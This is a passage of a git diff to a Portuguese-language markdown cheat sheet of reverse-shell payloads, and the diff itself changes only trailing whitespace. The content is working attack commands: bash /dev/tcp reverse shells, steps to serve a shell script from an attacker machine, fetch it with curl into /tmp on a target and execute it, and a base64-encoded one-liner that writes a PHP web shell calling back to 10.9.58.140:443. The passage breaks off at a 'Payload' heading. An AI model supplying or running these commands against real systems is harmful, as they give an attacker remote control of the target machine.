@@ -1,18 +1,18 @@
-## Payloads:
+## Payloads:  
 
-### Bash:
-`/bin/bash -c 'bash -i > /dev/tcp/$LHOST/$LPORT 0>&1`
-`bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1`
+### Bash:  
+`/bin/bash -c 'bash -i > /dev/tcp/$LHOST/$LPORT 0>&1`  
+`bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1`  
 
-## Shell reversa com script bash:
-1. Crie um script em bash com o payload `bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1` e extensão `.sh`.
-2. Inicie um servidor http na máquina atacante com `python3 -m http.server 80`
-3. Faça o download do script na máquina alvo na pasta temporária com `curl http://$LHOST/shell.sh -o /tmp/shell.sh`
-4. Altere a permissão de execução do arquivo no alvo com `chmod +x /tmp/shell.sh`
-5. Execute o script no alvo com `/bin/bash /tmp/shell.sh`
+## Shell reversa com script bash:  
+1. Crie um script em bash com o payload `bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1` e extensão `.sh`.  
+2. Inicie um servidor http na máquina atacante com `python3 -m http.server 80`  
+3. Faça o download do script na máquina alvo na pasta temporária com `curl http://$LHOST/shell.sh -o /tmp/shell.sh`  
+4. Altere a permissão de execução do arquivo no alvo com `chmod +x /tmp/shell.sh`  
+5. Execute o script no alvo com `/bin/bash /tmp/shell.sh`  
 
 
-## Criar shell reversa em PHP no alvo com echo, utilize o comando abaixo para gerar o payload:
+## Criar shell reversa em PHP no alvo com echo, utilize o comando abaixo para gerar o payload:  
 ```bash
 echo "echo $(echo "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.9.58.140/443 0>&1'\"); ?>" | base64) | base64 -d > shell.php"
 # Payload:
